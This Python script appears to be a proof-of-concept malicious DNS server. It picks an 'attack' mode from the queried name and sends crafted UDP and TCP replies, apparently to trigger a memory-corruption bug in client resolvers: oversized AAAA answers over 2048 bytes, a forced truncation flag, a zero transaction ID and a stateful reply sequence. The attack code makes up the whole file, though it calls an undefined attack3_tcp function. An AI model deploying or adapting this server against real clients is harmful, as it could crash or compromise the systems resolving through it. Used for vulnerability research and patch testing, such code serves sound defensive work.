#!/usr/bin/env python3

import socket
import struct
import threading
import time
import sys

from dnsutil import DNSParser, DNSMessage, DNSHeader, DNSQuestion, DNSRR, DNSFlags

HOST=""
PORT=53


def dw(v):
    return struct.pack("!H", v)

def dd(v):
    return struct.pack("!L", v)

def log(*args):
    print(*args)
    sys.stdout.flush()


def attack1_udp(request):

    flags = DNSFlags(request.header.flags.flags_int())
    flags.set(["QR", "AA", "TC"])

    question = request.questions[0]
    answers = []

    # Reply > 2048 bytes
    for i in range(64):
        answers.append(DNSRR(question.labels, 28, 1, 0, 16, b"B"*16))

    header = DNSHeader(request.header.ID, flags, 1, 64, 0, 0)
    message = DNSMessage(header, [question], answers, [], [])
    return message.bytes()


def attack1_tcp(request):

    flags = DNSFlags(request.header.flags.flags_int())
    flags.set(["QR", "AA"])

    question = request.questions[0]
    rtype = question.qtype
    answers = []

    # Type A reply
    if rtype == 1:
        ancount = 1
        for i in range(ancount):
            answers.append(DNSRR(question.labels, rtype, 1, 10, 4, b"D"*4))

    # Type AAAA reply (> 2048 bytes)
    if rtype == 28:
        ancount = 64
        for i in range(ancount):
            answers.append(DNSRR(question.labels, rtype, 1, 10, 16, b"B"*16))

    header = DNSHeader(request.header.ID, flags, 1, ancount, 0, 0)
    message = DNSMessage(header, [question], answers, [], [])
    return message.bytes()


def invalid_id(request):

    flags = DNSFlags(request.header.flags.flags_int())
    flags.set(["QR", "AA"])

    question = request.questions[0]
    rtype = question.qtype
    answers = []

    # Type A reply
    if rtype == 1:
        ancount = 128
        for i in range(ancount):
            answers.append(DNSRR(question.labels, rtype, 1, 0, 4, b"D"*4))

    # Type AAAA reply
    if rtype == 28:
        ancount = 64
        for i in range(ancount):
            answers.append(DNSRR(question.labels, rtype, 1, 0, 16, b"B"*16))

    header = DNSHeader(0x0000, flags, 1, ancount, 0, 0)
    message = DNSMessage(header, [question], answers, [], [])
    return message.bytes()


def attack2_udp(request):

    flags = DNSFlags(request.header.flags.flags_int())
    flags.set(["QR", "AA"])

    question = request.questions[0]
    rtype = question.qtype
    answers = []

    # Type A reply
    if rtype == 1:
        ancount = 128
        for i in range(ancount):
            answers.append(DNSRR(question.labels, rtype, 1, 0, 4, b"D"*4))

    # Type AAAA reply
    if rtype == 28:
        ancount = 64
        for i in range(ancount):
            answers.append(DNSRR(question.labels, rtype, 1, 0, 16, b"B"*16))

    header = DNSHeader(request.header.ID, flags, 1, 128, 0, 0)
    message = DNSMessage(header, [question], answers, [], [])
    return message.bytes()


def udp_server():
    """UDP request handler"""

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((HOST, PORT))

    attack2_state = {}

    while True:
        data, addr = sock.recvfrom(1024)
        log("[UDP] Datagram from {}:{}".format(*addr))

        # Parse DNS request
        tmp, request = DNSParser.parse_message(data)
        log("[UDP] {} bytes in: {}".format(len(data), request.header))

        if not request.questions or not request.questions[0].labels:
            continue

        # Execute selected attack
        attack = request.questions[0].labels[0].decode("ascii")
        if attack == "attack1":
            if request.questions[0].qtype == 28:
                log("[attack1] Sending UDP reply to {}:{}".format(*addr))
                data = attack1_udp(request)
                sock.sendto(data, addr)
        if attack == "attack2":
            state = attack2_state.get(addr[0], 0)
            if state == 0:
                log("[attack2] Sending invalid ID to {}:{}".format(*addr))
                data = invalid_id(request)
                sock.sendto(data, addr)
                attack2_state[addr[0]] = 1
            if state == 1:
                log("[attack2] Ignoring request from {}:{}".format(*addr))
                attack2_state[addr[0]] = 2
            if state == 2:
                log("[attack2] Sending UDP reply to {}:{}".format(*addr))
                data = attack2_udp(request)
                sock.sendto(data, addr)
                attack2_state[addr[0]] = 3
            if state == 3:
                log("[attack2] Sending UDP reply to {}:{}".format(*addr))
                data = attack2_udp(request)
                sock.sendto(data, addr)
                attack2_state.pop(addr[0], None)

def tcp_server():
    """TCP request handler"""

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((HOST, PORT))
    sock.listen(10)

    while True:
        conn, addr = sock.accept()
        log("[TCP] Connection from {}:{}".format(*addr))

        while True:
            # Read message length
            try:
                msglen = struct.unpack("!H", conn.recv(2))[0]
                data = conn.recv(msglen)
            except:
                log("[TCP] Disconnected from {}:{}".format(*addr))
                break

            # Parse DNS request header
            tmp, request = DNSParser.parse_message(data)
            log("[TCP] {} bytes in: {}".format(len(data), request.header))

            if not request.questions or not request.questions[0].labels:
                continue

            # Execute selected attack
            attack = request.questions[0].labels[0].decode("ascii")
            if attack == "attack1":
                log("[attack1] Sending TCP reply to {}:{}".format(*addr))
                data = attack1_tcp(request)
                conn.sendall(dw(len(data)) + data)
            if attack == "attack3":
                log("[attack3] Sending TCP reply to {}:{}".format(*addr))
                data = attack3_tcp(request)
                conn.sendall(dw(len(data)) + data)


if __name__ == "__main__":

    if len(sys.argv) > 1:
        HOST = sys.argv[1]

    if len(sys.argv) > 2:
        PORT = sys.argv[2]
        
    udp_thread = None
    tcp_thread = None

    while True:
        if not udp_thread or not udp_thread.is_alive():
            log("Starting UDP server...")
            udp_thread = threading.Thread(target=udp_server)
            udp_thread.daemon = True
            udp_thread.start()

        if not tcp_thread or not tcp_thread.is_alive():
            log("Starting TCP server...")
            tcp_thread = threading.Thread(target=tcp_server)
            tcp_thread.daemon = True
            tcp_thread.start()

        time.sleep(5)

